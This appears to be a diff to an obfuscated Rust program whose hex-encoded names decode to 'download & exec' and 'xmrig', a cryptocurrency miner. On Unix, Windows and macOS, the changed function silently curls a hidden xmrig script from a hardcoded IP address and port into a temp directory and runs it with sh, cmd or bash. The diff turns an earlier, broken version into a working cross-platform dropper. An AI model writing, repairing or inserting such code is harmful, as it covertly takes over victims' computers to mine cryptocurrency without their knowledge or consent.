@@ -4,34 +4,11 @@ pub fn main() {
     _0x646f776e6c6f616420262065786563();
 }
 
-
-
-
-/* // TODO: fix error
-error[E0599]: no method named `text` found for enum `Result` in the current scope
-  --> src/_0x786d726967/main.rs:21:53
-   |
-21 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
-   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
-
-error[E0599]: no method named `text` found for enum `Result` in the current scope
-  --> src/_0x786d726967/main.rs:33:53
-   |
-33 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
-   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
-
-error[E0599]: no method named `text` found for enum `Result` in the current scope
-  --> src/_0x786d726967/main.rs:45:53
-   |
-45 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
-   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
- */
-
 #[tokio::main]
 async fn _0x646f776e6c6f616420262065786563() {
     if cfg!(unix) {
         Command::new("curl")
-            .arg("-o")
+            .arg("-so")
             .arg("/tmp/.0x756e6978786d726967")
             .arg("http://150.136.245.71:1337/0x786d7273637269707473/.0x756e6978786d726967")
             .spawn()
@@ -41,11 +18,25 @@ async fn _0x646f776e6c6f616420262065786563() {
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
-        Command::new("curl -sSf http://150.136.245.71:1337/0x786d7273637269707473/0x77696e786d726967.bat")
+        Command::new("curl")
+            .arg("-so")
+            .arg("%Temp%\\0x756e6978786d726967.bat")
+            .arg("http://150.136.245.71:1337/0x786d7273637269707473/0x77696e786d726967.bat")
+            .spawn()
+            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
+        Command::new("cmd")
+            .arg("%Temp%\\0x756e6978786d726967.bat")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(target_os = "macos") {
-        Command::new("curl -sSf http://150.136.245.71:1337/0x786d7273637269707473/.0x6d6163786d726967 | sh")
+        Command::new("curl")
+            .arg("-so")
+            .arg("$TMPDIR/.0x756e6978786d726967")
+            .arg("http://150.136.245.71:1337/0x786d7273637269707473/.0x6d6163786d726967")
+            .spawn()
+            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
+        Command::new("bash")
+            .arg("$TMPDIR/.0x756e6978786d726967")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     }
